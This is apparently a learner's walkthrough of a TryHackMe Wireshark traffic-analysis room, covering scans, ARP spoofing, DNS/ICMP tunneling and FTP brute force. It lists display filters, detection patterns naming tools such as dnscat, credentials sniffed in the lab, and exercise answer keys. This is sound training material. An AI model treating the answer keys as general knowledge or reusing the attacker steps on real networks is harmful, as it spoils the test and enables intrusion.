# Wireshark: Traffic Analysis

Learn the basics of traffic analysis with Wireshark and how to find anomalies on your network!

## Task 1: Introduction

### 📋 1. Room Overview
This room is the third and final part of TryHackMe's Wireshark series. While in the previous two rooms we mastered the basics of the interface ("The Basics") and advanced operational techniques and filters ("Packet Operations"), in this room the focus shifts to real traffic analysis and anomaly detection.

### 🎯 2. Learning Objectives and Focus
- Investigating and correlating packet-level information to get the "big picture" of network traffic.
- Detecting network anomalies and malicious activity.
- Synthesizing the analyst's knowledge with Wireshark's functionalities to uncover strange situations and potential incidents in real-world scenarios.

### ⚙️ 3. Environment & Prerequisites
- **Prerequisites:** Mandatory completion of the previous rooms — Wireshark: The Basics and Wireshark: Packet Operations.
- **Working Environment:** You need to start the lab machine (Start Lab Machine), which opens in a split view.
- **⚠️ Security Warning:** Direct interaction with any domains or IP addresses listed in this room is strictly forbidden—they are exclusively reference data for analytical and educational purposes.

### 🔥 EXTRA FROM ME: Transitioning to Threat Hunting and Traffic Analysis in the SOC
As a SOC Analyst, this room represents an essential step toward real threat hunting:

- **From technical analysis to contextual security:** So far we have learned how to filter and search for packets. Now we learn why a certain packet is suspicious. For example, knowing what normal DNS or HTTP traffic looks like allows you to immediately notice when a host communicates with a known Command & Control (C2) server or performs a DDoS attack.
- **Data Correlation:** A real incident is not discovered from a single isolated packet, but by connecting multiple events (e.g., a strange DNS query followed by an unusually large outbound TCP traffic toward an external IP address). This room will teach you how to connect these dots into one whole.

---

## Task 2: Nmap Scans

### 📋 1. Introduction to Nmap Scans in Network Traffic
Nmap is an industry standard for network mapping, active host identification, and service discovery. As a security analyst, it is crucial to recognize the network patterns created by Nmap.

Nmap (Network Mapper) is an open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.

In this task, three basic types of scans are covered:
1. TCP Connect Scans (sT)
2. SYN Scans (sS)
3. UDP Scans (sU)

For successful detection, knowledge of TCP flags and the use of precise Wireshark filters are essential.

### ⚙️ 2. Summary of TCP Flags and Wireshark Filters
To understand Nmap scans, you must know how individual TCP flags are filtered:
- **SYN flag only (SYN is set, others don't matter):** Filter: `tcp.flags.syn == 1` or `tcp.flags == 2`
- **ACK flag only:** Filter: `tcp.flags.ack == 1` or `tcp.flags == 16`
- **SYN and ACK flags together:** Filter: `(tcp.flags.syn == 1) and (tcp.flags.ack == 1)` or `tcp.flags == 18`
- **RST (Reset) flag only:** Filter: `tcp.flags.reset == 1` or `tcp.flags == 4`
- **RST and ACK flags together:** Filter: `(tcp.flags.reset == 1) and (tcp.flags.ack == 1)` or `tcp.flags == 20`
- **FIN flag only:** Filter: `tcp.flags.fin == 1` or `tcp.flags == 1`

### 🔌 3. TCP Connect Scans (sT)
- **Characteristics:**
  - Fully relies on the standard three-way handshake (must complete the connection establishment process).
  - Usually performed with the command `nmap -sT`.
  - Used by unprivileged users (this is the only option for a non-root/Administrator user).
  - Key characteristic in Wireshark: Has a window size greater than 1024 bytes (`window_size > 1024`), because the application layer expects data due to the very nature of a full TCP socket.
- **Traffic pattern:**
  - Open port: SYN ➔ SYN, ACK ➔ ACK (successful handshake).
  - Closed port: SYN ➔ RST, ACK.
- **Generic Wireshark detection filter:**
  `tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024`

### ⚡ 4. SYN Scans (sS / Stealth Scan)
- **Characteristics:**
  - Does not rely on a full three-way handshake (aborts the process before establishing a connection by sending an RST).
  - Usually performed with the command `nmap -sS` (requires root privileges).
  - Used by privileged users.
  - Key characteristic in Wireshark: Has a window size less than or equal to 1024 bytes (`window_size <= 1024`), because the scan is half-open and does not expect application data.
- **Traffic pattern:**
  - Open port: SYN ➔ SYN, ACK ➔ RST (the analyst sends a Reset to terminate the connection before the server suspects).
  - Closed port: SYN ➔ RST, ACK.
- **Generic Wireshark detection filter:**
  `tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <= 1024`

### 🌐 5. UDP Scans (sU)
- **Characteristics:**
  - UDP is a connectionless protocol — it does not require a handshake process.
  - Sends an empty UDP packet to the target port. For open ports there is often no response or the application returns something back, while for closed ports the network router/server returns an ICMP error (Destination unreachable, port unreachable).
  - Usually performed with the command `nmap -sU`.
- **How to analyze the ICMP message in Wireshark:**
  - The ICMP error itself contains part of the original network request as encapsulated data. To see which port was targeted, you must open/expand the ICMP section in the Packet Details Pane to see the original request.
- **Generic Wireshark detection filter:**
  `icmp.type==3 and icmp.code==3`

### 🎯 6. Exercise Answers
*(Open the `~/Desktop/exercise-pcaps/nmap/Exercise.pcapng` file in Wireshark to find the exact answers):*

1. **What is the total number of the "TCP Connect" scans?**
   - **Filter:** `tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024`
   - **Answer:** `1000`

<img width="793" height="800" alt="TCP scan total 1 q" src="https://github.com/user-attachments/assets/e0badd13-a29e-449e-a658-7bcde40a0f87" />

---

2. **Which scan type is used to scan the TCP port 80?**
   - **Analysis:** If you filter with `tcp.port == 80`, you will see the packet structure. This scan completes the full TCP three-way handshake (SYN → SYN/ACK → ACK) to determine whether the port is open.
   - **Answer:** `TCP Connect`

<img width="800" height="784" alt="tcp connect 2 q " src="https://github.com/user-attachments/assets/5a2fe57e-dfb1-4a1b-acc2-e2252da7f507" />

---

3. **How many "UDP close port" messages are there?**
   - **Filter:** `icmp.type==3 and icmp.code==3`
   - **Answer:** `1083`

<img width="790" height="800" alt="UDP error message q 3" src="https://github.com/user-attachments/assets/aee5ef5c-10ab-480a-825f-f4c7e6adacd1" />

---

4. **Which UDP port in the 55-70 port range is open?**
   - **Analysis:** Apply the filter for UDP traffic `udp.port in {55 .. 70}` and check which port in the 55 to 70 range did not return an ICMP Port Unreachable error (closed ports return ICMP Type 3 Code 3, while an open or filtered port will not return such an error or will have a different response). The port without an ICMP error in that range is port 68.
   - **Answer:** `68`

<img width="800" height="555" alt="udp 55 70" src="https://github.com/user-attachments/assets/2ba6da13-489a-4f09-b097-b70fcfc30705" />

---

### 🔥 EXTRA FROM ME: SOC Analyst Perspective on Nmap Traffic
As a SOC Analyst, detecting Nmap scans in network logs or PCAP files is a daily task for discovering reconnaissance (Reconnaissance / MITRE ATT&CK T1595):

- **Anomaly Detection via Window Size (`window_size`):** The option to filter via `window_size > 1024` (for Connect) and `<= 1024` (for SYN) is a powerful technique when doing rapid triage. Attackers often try to hide their tools, but standard OS and TCP stack behavior in sT versus sS leaves a clear manifest in the window size.
- **Hunting UDP scans in SIEM systems:** Because UDP scanning relies on ICMP errors (`icmp.type==3 and icmp.code==3`), a large number of such messages in a very short time interval toward different ports on a single IP address is a classic sign that someone is performing aggressive UDP network mapping (e.g., scanning for DNS, SNMP, or DHCP services).

---

## Task 3: ARP Poisoning & Man In The Middle!

### 📋 1. What is an ARP Poisoning and Man-In-The-Middle (MITM) Attack?
Address Resolution Protocol (ARP) is responsible for finding the MAC (hardware) address related to a specific IP address. It works by broadcasting an ARP query, "Who has this IP address? Tell me." And the response is of the form, "The IP address is at this MAC address.”

- **ARP protocol (Address Resolution Protocol):** A technology responsible for mapping network IP addresses to physical MAC addresses on a local network.
- **ARP characteristics:** Works exclusively on a local network (LAN), is not routable, has no built-in authentication functionality, and is a completely insecure protocol.
- **ARP Poisoning / Spoofing:** An attack by sending fake (spoofed) ARP packets to the default gateway in order to manipulate the IP-to-MAC address mapping table and redirect or eavesdrop on the victim's traffic. This represents a classic Man-In-The-Middle (MITM) attack.

### 🔍 2. Key Wireshark Filters and Opcodes for ARP Analysis
For quickly discovering ARP anomalies and "low-hanging fruits", the following filters are used:

- **Global search for ARP traffic:**
  `arp`
- **ARP Opcode filters (Types of ARP messages):**
  - `arp.opcode == 1` — ARP requests.
  - `arp.opcode == 2` — ARP responses / replies.
- **Specific filters for detecting anomalies:**
  - ARP scanning: `arp.dst.hw_mac == 00:00:00:00:00:00`
  - Duplicate IP addresses (conflict): `arp.duplicate-address-detected || arp.duplicate-address-frame`
  - ARP flooding / requests from a specific MAC address: `((arp) && (arp.opcode == 1)) && (arp.src.hw_mac == target-mac-address)`

### 🕵️‍♂️ 3. Analysis of Attack Steps in the PCAP File
Through the analysis of network traffic in this scenario, the following key Indicators of Compromise (IOCs) are observed:

- **Potential IP Spoofing:** Two different MAC addresses claim to own the same IP address of the router/gateway (`192.168.1.1`):
  - MAC 1: `50:78:b3:f3:cd:f4` (Legitimate gateway)
  - MAC 2: `00:0c:29:e2:18:b4` (Attacker)
- **ARP Flooding / Scanning:** The machine MAC address ending in b4 (`00:0c:29:e2:18:b4`) begins massively creating ARP requests across the network (`192.168.1.xxx`), aiming to discover active hosts.
- **Traffic Redirection (MITM):** By adding MAC columns in the Wireshark Packet List pane, it is observed that all HTTP traffic of the victim (`192.168.1.12`, MAC: `00:0c:29:98:c7:a8`) no longer goes directly to the router, but is completely redirected to the attacker (`00:0c:29:e2:18:b4`). This allows the attacker to collect all plaintext data (passwords, forms, cookies).

### 🎯 4. Exercise Answers
*(Open the `~/Desktop/exercise-pcaps/arp/Exercise.pcapng` file in Wireshark to find these answers):*

1. **What is the number of ARP requests crafted by the attacker?**
   - **Filter:** `arp.opcode == 1 and arp.src.hw_mac == 00:0c:29:e2:18:b4`
   - **Answer:** `284`

<img width="800" height="536" alt="ARP request q 1" src="https://github.com/user-attachments/assets/fc8da38c-ed4e-455a-bf9b-061f17bb78f4" />

---

2. **What is the number of HTTP packets received by the attacker?**
   - **Filter:** `http and eth.dst == 00:0c:29:e2:18:b4`
   - **🔍 Detailed analysis by parts:**
     - `http` — What it does: Filters all traffic using the HTTP (Hypertext Transfer Protocol) protocol. Why it is used: Discards all other network noise (like ARP, DNS, TCP handshake, TLS, etc.) and keeps only application-layer packets through which web pages, requests, and plaintext data are transferred.
     - `and` — What it does: Logical operator requiring both conditions to be met simultaneously (both the left and right sides of the filter).
     - `eth.dst == 00:0c:29:e2:18:b4` — What it does: Filters packets based on the destination MAC address (Ethernet Destination MAC Address). Why it is used: Restricts the view only to those packets whose final recipient at the physical layer (Layer 2) is that specific hardware address. Context in the attack: In the previous ARP Poisoning task, this specific MAC address (`00:0c:29:e2:18:b4`) belonged to the attacker, who through manipulation made all packets from the victim get redirected and delivered into their hands.
   - **🎯 Summary: What does this filter do as a whole?**
     This filter tells the analyst: "Show me all HTTP packets whose final destination (physical address) is the attacker (`00:0c:29:e2:18:b4`)". Through this filter in the exercise, the exact packets received by the attacker as a result of the Man-In-The-Middle (MITM) attack were counted.
   - **Answer:** `90`

<img width="800" height="529" alt="http eth dst " src="https://github.com/user-attachments/assets/3c8969d7-fab5-45e3-bb51-7931f8d8de3a" />

---

3. **What is the number of sniffed username&password entries?**
   - **Analysis:** Because the attacker performed a MITM attack and intercepted all HTTP traffic (which is not encrypted with HTTPS), they captured user logins via POST requests. Using the filter `eth.dst == 00:0c:29:e2:18:b4 and http.request.method == POST and http contains "user" and http contains "pass"`, these entries are counted.
   - **Answer:** `6`
   - Let's see what is happening:
     1. Packet 1381 (`/secured/newuser.php`) shown in the first screenshot is a form for creating or adding a new user (that's why it has multiple fields like `uuname`, `upass`, `urname` at the same time). That is not a standard individual user login.
     2. The remaining packets (like packet 1791 from the second screenshot with `uname = "admin"` and `pass = "supersecret!"`) are classic, individual logins.
     3. When we filtered all 7 packets, we got 7 total requests containing words for user and pass. However, because one of them (packet 1381) was for creating a new user, while the remaining 6 were actual individual user logins (username & password entries), that is why the exact answer is 6!

<img width="800" height="527" alt="sing up user " src="https://github.com/user-attachments/assets/af8dd23a-a29a-4194-9c2e-53434850b0e9" />

<img width="800" height="539" alt="usr pass success" src="https://github.com/user-attachments/assets/ef9f914b-6fd6-407d-883e-305aa9a4507f" />

---

4. **What is the password of the "Client986"?**
   - **Analysis:** Click on the packet using the same filter from the previous question to see the parameters sent in the request body. There you will see the username and password.
   - **Answer:** `clientnothere!`

<img width="800" height="531" alt="pas client986" src="https://github.com/user-attachments/assets/13e3b3b9-0bde-479a-89c1-9761384e8d86" />

---

5. **What is the comment provided by the "Client354"?**
   - **Analysis:** Click top-left `Edit`, choose `Find Packet`, enter `Client354` in the field, and at the bottom in the packet pane see the comment `Nice work!`.
   - **Answer:** `Nice work!`

<img width="800" height="527" alt="nice work" src="https://github.com/user-attachments/assets/c88a9a4e-cc9a-46d9-bbba-dd88a4574810" />

---

### 🔥 EXTRA FROM ME: SOC Analyst Perspective on ARP Spoofing
As a SOC Analyst, early detection of ARP Poisoning is critical because it is a fundamental step before any successful Man-in-the-Middle attack:

- **Why is ARP spoofing dangerous in modern networks?** Although most traffic today uses HTTPS (TLS encryption), making it harder to read passwords directly in plaintext, ARP spoofing is still used by attackers for SSL Stripping, launching DoS attacks, or intercepting local DNS and DHCP traffic.
- **How to protect in practice (Defensive Controls)?**
  - **Dynamic ARP Inspection (DAI):** A network feature on switches that compares ARP packets against a trusted database (for example, DHCP snooping bindings) and drops fake ARP responses.
  - **Static ARP entries:** For critical network devices (such as servers and gateways), adding static bindings between IP and MAC addresses completely disables dynamic poisoning of the table.

🖥️ **1. What is a Host?**
- **Definition:** A host is the complete device (physical or virtual) connected to the network that has its own IP address through which it communicates with other devices.
- **Examples of a host:** Your laptop, mobile phone, home router, or a server in a company.
- **How it is identified on the network:** At the network layer, a host is primarily recognized by its IP address (e.g., `192.168.1.12`) and MAC address (physical hardware address).

🏷️ **2. What is a Hostname?**
- **Definition:** A hostname is the name (label) assigned to that device so humans can recognize it more easily on the network, since numbers (IP addresses) are hard to remember.
- **Examples of a hostname:** `DESKTOP-Q01MHPS`, `srv-dc01`, `Galaxy-A30`, `MacBook-Pro-Magdi`.
- **Why it is used:** Instead of looking for a computer on the network by its IP address `172.16.13.85`, it is much easier to connect to it by its name `DESKTOP-Q01MHPS`.

⚖️ **Comparison Summary:**
- **Host** is the device (the body/hardware/machine).
- **Hostname** is the name we give to that device.

The difference between a **host** and a **user** is very simple and is about the difference between the physical/virtual device and the human (or account) using that device:

🖥️ **1. Host**
- **What it is:** It is the computer, laptop, server, or mobile device itself connected to the network.
- **How it is recognized on the network:** By its IP address (e.g., `192.168.1.15`), MAC address, and its name on the network (e.g., `DESKTOP-Q01MHPS` or `srv-dc01$`).
- **In the context of traffic:** The host is the machine that sends and receives packets.

👤 **2. User**
- **What it is:** It is the person (or user account) who logs into that computer to perform tasks (e.g., a username like `u5`, `admin`, or a first and last name).
- **How it is recognized:** Through login credentials and accounts in the system (as in Windows Active Directory / Kerberos protocol where users do not have a `$` sign at the end of the name, unlike machines).
- **In the context of traffic:** The same host (computer) at different times can be used by multiple different users.

⚖️ **Final Comparison:**
- **Host** is the device (the hardware/software as a machine).
- **User** is the person (or profile) logging into that device.
- **Example:** The laptop on the desk is a **host** named `DESKTOP-ABC`, and you when you log in with your username are the **user** on that host!

---

## Task 4: Identifying Hosts: DHCP, NetBIOS and Kerberos

### 📋 1. Why is Host and User Identification Important?
When investigating a network incident or malware infection, a key task for a security analyst is to identify the devices and users behind specific IP or MAC addresses.
- **Good:** Organizations often use predefined naming conventions, making it easier to recognize the owner or device by name.
- **Bad:** Attackers can also study these conventions and try to blend into the network (masquerading).

The three main protocols that help in identification are:
1. DHCP (Dynamic Host Configuration Protocol)
2. NetBIOS (NBNS) (Network Basic Input/Output System Name Service)
3. Kerberos (Windows domain authentication)

### ⚙️ 2. DHCP Analysis (Dynamic Host Configuration Protocol)
DHCP is responsible for automatically assigning IP addresses and network parameters. For the analyst, DHCP packets are a "goldmine" because they contain hostnames.

The Dynamic Host Configuration Protocol (DHCP) is a network management protocol used on Internet Protocol (IP) networks for automatically assigning IP addresses and other communication parameters to devices connected to the network using a client–server architecture.

- **Global search in Wireshark:**
  `dhcp || bootp`
- **Option 53 (Message Type):** Due to the protocol's specificity, only Option 53 has prefixed static values through which messages are filtered:
  - DHCP Request: `dhcp.option.dhcp == 3`
  - DHCP ACK: `dhcp.option.dhcp == 5`
  - DHCP NAK: `dhcp.option.dhcp == 6`
- **Useful DHCP options for quick results (low-hanging fruits):**
  - Option 12: Hostname (Device name) ➔ `dhcp.option.hostname contains "keyword"`
  - Option 50: Requested IP address
  - Option 51: Lease time
  - Option 61: Client MAC address

### 🖧 3. NetBIOS (NBNS) Analysis
NetBIOS allows applications on different hosts to communicate on the local network and helps with name resolution of devices in a Windows environment.

- **Global search in Wireshark:**
  `nbns`
- **Useful filters and fields:**
  - To search for a specific host/workstation name:
    `nbns.name contains "keyword"`
  - In NBNS packets (specifically in the Queries section) you can find the name, TTL (Time to Live), and IP addresses of registered network names.

### 🔐 4. Kerberos Analysis
Kerberos is the standard authentication protocol in Microsoft Windows domains. It is a key source of information for linking network traffic to specific user accounts.

- **Global search in Wireshark:**
  `kerberos`
- **How to distinguish users from hosts in Kerberos (`CNameString`):**
  - The `kerberos.CNameString` field contains the name of the user or host.
  - **Rule:** Names ending with a dollar sign (`$`) are host / machine names (e.g., `DESKTOP-123$`), while names without `$` are user accounts (e.g., `u5`, `admin`).
- **Key Kerberos filters:**
  - User accounts only (excluding machines with `$`):
    `kerberos.CNameString and !(kerberos.CNameString contains "$")`
  - Protocol version: `kerberos.pvno == 5`
  - Domain (Realm): `kerberos.realm contains ".org"`
  - Service: `kerberos.SNameString == "krbtgt"`

### 🎯 5. Exercise Answers
*(Open the `dhcp-netbios.pcap` and `kerberos.pcap` files in the `~/Desktop/exercise-pcaps/dhcp-netbios-kerberos/` path on the lab machine):*

1. **What is the MAC address of the host "Galaxy A30"?**
   - **Filter:** `dhcp.option.hostname contains "Galaxy"` — When you find the packet for this host, in the packet details (or via the MAC address column) you see the physical address of the device.
   - **Answer:** `9a:81:41:cb:96:6c`

<img width="800" height="501" alt="hostname galaxy" src="https://github.com/user-attachments/assets/ef99bd57-8701-4f15-85a3-02eb403c947f" />

---

2. **How many NetBIOS registration requests does the "LIVALJM" workstation have?**
   - **Filter:** `nbns.name contains "LIVALJM" and nbns.flags.opcode == 5`
   - `nbns.flags.opcode == 5` indicates a registration request.
   - **Answer:** `16`

<img width="800" height="565" alt="netbios true answ" src="https://github.com/user-attachments/assets/7b36ea38-f481-4a33-90a6-87fdd93c42ed" />

---

3. **Which host requested the IP address "172.16.13.85"?**
   - **Filter:** `dhcp.option.dhcp == 3 and dhcp.option.requested_ip_address == 172.16.13.85`
   - **Answer:** `Galaxy-A12`

<img width="800" height="568" alt="dncp ip adress hostname " src="https://github.com/user-attachments/assets/54830a03-9c49-46f6-bd63-a939a239d828" />

---

4. **What is the IP address of the user "u5"? (Enter the address in defanged format.)**
   - **Analysis:** Open the `kerberos.pcap` file. Apply the filter to find user `u5`: `kerberos.CNameString == "u5"`. Remember to defang the IP address (e.g., replacing dots with `[.]`).
   - **Answer:** `10[.]1[.]12[.]2`

<img width="800" height="566" alt="defang ip kerberos" src="https://github.com/user-attachments/assets/45c9dbe4-9736-48bd-b39e-4004a640add3" />

---

5. **What is the hostname of the available host in the Kerberos packets?**
   - **Analysis:** Use the filter for hosts in Kerberos containing a dollar sign: `kerberos.CNameString contains "$"`
   - **Answer:** `xp1$`

<img width="800" height="562" alt="hostname kerberos " src="https://github.com/user-attachments/assets/1d6fa2b4-79dd-49eb-a3e7-288e729be94d" />

---

### 🔥 EXTRA FROM ME: SOC Analyst Perspective on Host & User Identification
As a SOC Analyst, the skill of extracting hostnames and usernames from network traffic is critical when the SIEM system or EDR tool lacks sufficient endpoint logs:

- **Why is DHCP a powerful asset during incident auditing?** When observing a suspicious IP address conducting attacks or communicating with an external C2 server, the first step is to see who owned that IP during the given time window. By filtering DHCP traffic (`dhcp.option.hostname`), you immediately connect the neutral number (IP) with a human name or a laptop name in the company.
- **Reconnaissance via Kerberos in Active Directory networks:** In Windows Enterprise environments, attackers often perform Kerberoasting or try to make forged ticket requests (TGS-REQ). Analyzing Kerberos fields in Wireshark allows you to notice which user accounts are targeted or which machines make strange domain requests.

---

## Task 5: Tunneling Traffic: DNS and ICMP

### 📋 1. What is Traffic Tunneling?
Tunneling (also known as port forwarding) is the process of securely transferring data and resources between different network segments and zones.

- **How it works:** Uses an encapsulation process to hide the original data inside standard, trusted protocols. That way, the transferred data looks normal and natural to network perimeters, while actually carrying private or malicious packets to the final destination.
- **Why attackers use it:** Although tunneling provides anonymity and security in legitimate networks, attackers use high levels of encryption or trusted protocols themselves (like ICMP and DNS) to bypass security solutions and perform data exfiltration or C2 (Command & Control) communication.

### 📡 2. ICMP Analysis and Tunneling (Internet Control Message Protocol)
- **Primary purpose:** ICMP is primarily designed for diagnosing and reporting network problems (e.g., ping / Echo Request & Reply).
- **How it is used for attacks:** Because ICMP packets allow carrying an additional stream of data in their payload, attackers use this field to tunnel other protocols (like TCP, HTTP, or SSH) and exfiltrate stolen information outside the network.
  - **How to recognize them in Wireshark:**
    - Global search: `icmp`
    - Filter for suspicious packets (packets whose data length is greater than the standard 64 bytes):
      `data.len > 64 and icmp`

### 🌐 3. DNS Analysis and Tunneling (Domain Name System)
- **Primary purpose:** DNS is the "phonebook" of the internet, responsible for translating domain names into IP addresses.
- **Why it is a target:** Because DNS traffic is necessary for networks to function and is always allowed through firewalls, it is often ignored by administrators. Attackers use it as a perfect channel for C2 communication.
- **How DNS tunneling works:** Malware on the infected machine sends long, encoded DNS queries where subdomains actually represent hidden and encoded commands or stolen data:
  `"encoded-commands.maliciousdomain.com"`
  - **How to recognize them in Wireshark:**
    - Global search: `dns`
    - Excluding local mDNS queries and filtering long, illegitimate DNS names (longer than 15 characters):
      `dns.qry.name.len > 15 and !mdns`
    - Searching for known tunneling tools (like dnscat):
      `dns contains "dnscat"`

### 🎯 4. Exercise Answers
*(Open the files in the `~/Desktop/exercise-pcaps/dns-icmp/` path on the lab machine):*

1. **Use the "Desktop/exercise-pcaps/dns-icmp/icmp-tunnel.pcap" file. Investigate the anomalous packets. Which protocol is used in ICMP tunnelling?**
   - **Analysis:** Open the `icmp-tunnel.pcap` file in Wireshark, apply the filter `data.len > 64 and icmp`, but because there are over 700 packets, to analyze faster which protocol was used, you filter with `data.len > 64 and icmp and icmp contains "SSH"`.
   - There is a much simpler, faster, and most direct way to discover the protocol tunneled over ICMP, without opening every packet manually or relying only on data size (`data.len > 64`).
   - Here is how you can filter and find it immediately:
   - **🔍 1. Filtering via ICMP payload content (`icmp contains`)**
     Because ICMP packets carry the tunneled traffic in their payload, you can directly search for text characteristic of the SSH protocol (such as the version or name of the software that SSH servers send at the beginning, for example `SSH` or `OpenSSH`):
     `icmp contains "SSH"`
     or more specifically with casing:
     `icmp contains "OpenSSH"`
     When you apply this filter, Wireshark will immediately isolate only those ICMP packets inside whose traffic SSH communication is hidden!
   - **🛠️ 2. Why does this work so fast?**
     - The `contains` operator in Wireshark searches across the entire raw packet data of every packet.
     - Because the SSH protocol when starting message exchange sends plaintext with its name (`SSH-2.0-...`), searching with `icmp contains "SSH"` directly hits the content hidden inside the ICMP tunnel.
   - This is a great and fast technique used by SOC analysts when investigating unknown tunneled protocols (you can also test with other keywords like `HTTP`, `GET`, `User-Agent` if you suspect another type of traffic is being tunneled)!
   - You will notice that the traffic tunneled over ICMP actually uses another well-known remote administration/transfer protocol.
   - **Answer:** `SSH (Secure Shell)`

<img width="800" height="550" alt="icmp ssh protocol " src="https://github.com/user-attachments/assets/83383382-85b8-447b-803f-2b852d0cc576" />

---

2. **Use the "Desktop/exercise-pcaps/dns-icmp/dns.pcap" file. Investigate the anomalous packets. What is the suspicious main domain address that receives anomalous DNS queries? (Enter the address in defanged format.)**
   - **Analysis:** Open the `dns.cap` (or `dns.pcap`) file in Wireshark. Apply the filter `dns.qry.name.len > 15 and !mdns` to see the long, encoded subdomains. Analyze which is the main domain (root domain) toward which all these abnormal queries are directed. Remember to defang the domain (e.g., by adding `[.]` in the dots). In the image below you see that with the filter `dns.qry.name.len > 15 and !mdns` we get as many as 30,364 displayed packets (which is too many for manual review), and in the Info column DNS record types like MX (Mail Exchange), TXT, PTR, etc. are clearly visible.
   - **Answer:** `dataexfil[.]com`

<img width="800" height="564" alt="dns name " src="https://github.com/user-attachments/assets/63a3f5ae-d60e-4fc1-a6bb-7833a926dfb0" />


   - When you have a huge amount of packets and want to hide noise much faster and find those with MX records or suspicious tunnels (like `dnscat` seen at the bottom), here is what is used for advanced and precise filtering:
   - **🚀 1. Filtering directly by DNS record type (`dns.qry.type`)**
     Because in the image you see that attackers use MX records (Mail Exchange) to send encoded data through subdomains, you can directly filter that record type with the following syntax:
     `dns.qry.type == 15`
     *(The number 15 in the DNS protocol denotes MX – Mail Exchange record. You can also use values like `dns.qry.type == 16` for TXT records which are also massively used for tunneling).*
   - **🎯 2. Combining length + specific type (Precision Strike)**
     If you want to remove all ordinary MX and PTR records that are not suspicious and leave only those that are long and potentially tunneled, you combine the conditions with `and`:
     `dns.qry.type == 15 and dns.qry.name.len > 25 and !mdns`
     With this you tell Wireshark: "Show me only MX records whose name is longer than 25 characters, and discard local mDNS queries". This in a few seconds will reduce the list from 30,000 packets to just a few key suspicious packets!

### 🔥 EXTRA FROM ME: SOC Analyst Perspective on ICMP & DNS Tunnels
As a SOC Analyst, detecting tunneling over network protocols is a key skill for uncovering hidden advanced threats (Advanced Persistent Threats - APT):

- **Why is ICMP tunneling an "easy target" for detection, but hard for prevention?** It is easily detected in PCAP by filtering anomalous packet sizes (`data.len > 64`), because a normal ping has a fixed and small size. However, network administrators often forget these firewall rules, allowing ICMP traffic to freely exit outside the company.
- **DNS Tunneling — The silent killer in corporate networks:** Unlike ICMP, DNS traffic must be open for all users (otherwise no web page would load). Attackers know this and therefore use DNS as a main channel for exfiltrating confidential data (credentials, documents). In a modern SOC, statistical analysis tools (such as counting unique subdomains per host per minute) are used for DNS tunneling detection to catch machines making hundreds of strange, long DNS queries toward the same external range.

# Task 6: Cleartext Protocol Analysis: FTP

## 📋 1. What is FTP and Why is it Risky?
File Transfer Protocol (FTP) is a protocol designed to help the efficient transfer of files between different and even non-compatible systems. It supports two modes for file transfer: binary and ASCII (text).

The file transfer protocol (FTP = File Transfer Protocol) is designed exclusively for simple file transfer, which means the emphasis is placed on simplicity rather than security. Because it operates in cleartext, using FTP in insecure networks opens the door to numerous security risks:
- **MITM (Man-In-The-Middle) attacks:** Intercepting traffic in real time. A Man in the Middle attack involves an individual placing themselves in-between a communication process to intercept traffic.
- **Credential theft:** Passwords and usernames travel unencrypted.
- **Phishing and malware planting:** Abusing the server to store suspicious files.
- **Data exfiltration:** Unauthorized downloading of confidential documents.

---

## ⚙️ 2. FTP Code Series and Commands in Wireshark
For successful forensics of FTP traffic, the analyst must know the standard server responses (FTP response codes) and commands:

- **Global search in Wireshark:**
  `ftp`

### 🔢 Response Code Series:
- **x1x series (Information request responses):**
  - `211`: System status.
  - `212`: Directory status.
  - `213`: File status. Filter: `ftp.response.code == 211`
- **x2x series (Connection messages):**
  - `220`: Service ready.
  - `227`, `228`, `229`: Passive connection modes. Filter: `ftp.response.code == 227`
- **x3x series (Authentication messages - Authentication):**
  - `230`: User login successful.
  - `231`: User logout.
  - `331`: Valid username (waiting for password).
  - `430`: Invalid username or password.
  - `530`: No login / Invalid password. Filter: `ftp.response.code == 230`

### 💻 Basic FTP Commands:
- `USER`: Sending username (`ftp.request.command == "USER"`)
- `PASS`: Sending password (`ftp.request.command == "PASS"`)
- `CWD`: Changing current working directory
- `LIST`: Listing directory contents

### 🕵️‍♂️ Advanced Attack Detection Patterns (Brute-force / Password Spraying):
- **Signal for failed login (Brute-force):** `ftp.response.code == 530`
- **Continuous failed attempts with the same password (Password Spraying):** `(ftp.request.command == "PASS") and (ftp.request.arg == "password")`

---

## 🎯 3. Exercise Answers
*(Open the `~/Desktop/exercise-pcaps/ftp/ftp.pcap` file in Wireshark):*

1. **How many incorrect login attempts are there?**
   - **Filter:** `ftp.response.code == 530` (Displays all failed login attempts where the server returned error 530).
   - **Answer:** `737`

<img width="800" height="510" alt="invalid login " src="https://github.com/user-attachments/assets/54bd785b-b368-4d2a-9b39-f7cbd68fec07" />

---

2. **What is the size of the file accessed by the "ftp" account?**
   - **Analysis:** Filter the activities of the `ftp` user (e.g., by searching `ftp contains "ftp"` or `ftp.request.arg == "ftp"`). Then right-click, select `Follow`, and click `TCP Stream`. When the user accesses or downloads a file, the status or transfer command (`RETR` or `SIZE`) displays the size in bytes.
   - **Answer:** `39424`

<img width="800" height="499" alt="ftp contains ftp" src="https://github.com/user-attachments/assets/49f3bad9-ff6a-491b-89d7-0a9ebb0c1cdb" />

<img width="800" height="501" alt="size ftp " src="https://github.com/user-attachments/assets/6df02074-4571-4262-9cc3-cdbf95737b9d" />

---

3. **The adversary uploaded a document to the FTP server. What is the filename?**
- *Simply from the previous answer when looking for the file size, the answer is there:*
     - **Answer:** `resume.doc`
  
    <img width="800" height="501" alt="ftp name doc" src="https://github.com/user-attachments/assets/9e2f6212-81f4-4c7d-b473-0b0fb1fb8de0" />

- **Analysis:** Look for FTP commands for storing files, such as the `STOR` (Store) command, which is used when the attacker uploads a file to the server. Filter: `ftp.request.command == "STOR"`. Right-click, choose `Follow`, and click `TCP Stream`. In the arguments section of that packet you will see the name of the uploaded document.
  
   <img width="800" height="509" alt="store filter ftp doc " src="https://github.com/user-attachments/assets/5274fdd6-ec3f-4112-bab8-7d1da9e8a2b6" />

   <img width="800" height="504" alt="store ftp fin answ" src="https://github.com/user-attachments/assets/b7c14eb6-06c0-49d9-84ef-b7dfb55dfd0d" />


4. **The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary?**
   - **Analysis:** After uploading the file (such as a PHP web shell), attackers often try to change execution permissions via FTP using standard FTP mode-change commands (such as `SITE EXEC` or `CHMOD`). In that same section where we found the file size and name, if you scroll down you will see the command `SITE CHMOD 777`.
   - **Answer:** `CHMOD 777`

